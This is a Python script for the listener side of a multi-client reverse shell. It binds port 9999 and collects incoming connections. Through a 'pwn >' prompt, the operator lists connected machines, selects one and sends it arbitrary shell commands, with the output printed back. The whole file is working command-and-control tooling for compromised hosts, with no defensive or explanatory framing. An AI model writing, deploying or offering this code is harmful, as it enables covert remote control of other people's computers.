import socket
import sys
import threading
from queue import Queue
queue=Queue()
n_threads=2
job_number=[1,2]
all_address = []
all_connections= []

def create_socket():	
	try:
		global host
		global port
		global s
		s=socket.socket()		
		host=""
		port=9999
	except socket.error as msg:
		print(msg)


def bind_socket():
	try:
		global host
		global port
		global s
		print("Binding the port: " + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Binding error :" + str(msg))


def accept_connections():
	for c in all_connections:
		c.close()
	del all_address[:]
	del all_connections[:]
	while True:
		try:
			conn,addr=s.accept()
			s.setblocking(1)
			all_connections.append(conn)
			all_address.append(addr)
			print("Connection has been established:"+str(addr[0]))
		except:
			print("Connection cannot be established")
			break;

def start_shell():
	while True:
		cmd=input("pwn >")
		if cmd=='list':
			list_all_connections()
		elif 'select' in cmd:
			conn=select_target(cmd)
			if conn is not None:
				send_commands(conn)
		elif cmd=='exit':
			s.close()
			sys.exit()
		else:
			print("connection can't be established")
		

def list_all_connections():
	results=''
	for i,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_address[i]
			del all_connections[i]
			continue
		results = results + str(i) + "  " + "ip: " + str(all_address[i][0]) + "port: " + str(all_address[i][1])  

	print("-----clients------" + "\n" + results)
	
def select_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn=all_connections[target]
		print("Now connected to: " + str(all_address[target][0]) + "\n")
		print(str(all_address[target][0]) + "> ", end="")
		return conn
	except:
		print("Invalid selection")
		return None
		
	
	
	
	
def send_commands(conn):
	while True:
		try:
			cmd=input()
			if cmd=='quit':
				break;
			else:
				data=str.encode(cmd)
				conn.send(data)
				client_response = str(conn.recv(20480),"utf-8")
				print(client_response)
		except:
			print("error sending commands")
			break;
		
		
def create_threads():
	for _ in range(n_threads):
		t=threading.Thread(target=work)
		t.daemon=True
		t.start()
def create_jobs():
	for x in job_number:
		queue.put(x)
	queue.join()

def work():
	while True:
		x=queue.get()
		if x==1:
			create_socket()
			bind_socket()
			accept_connections()
		if x==2:
			start_shell()
			

def main():
	create_threads()
	create_jobs()

main()

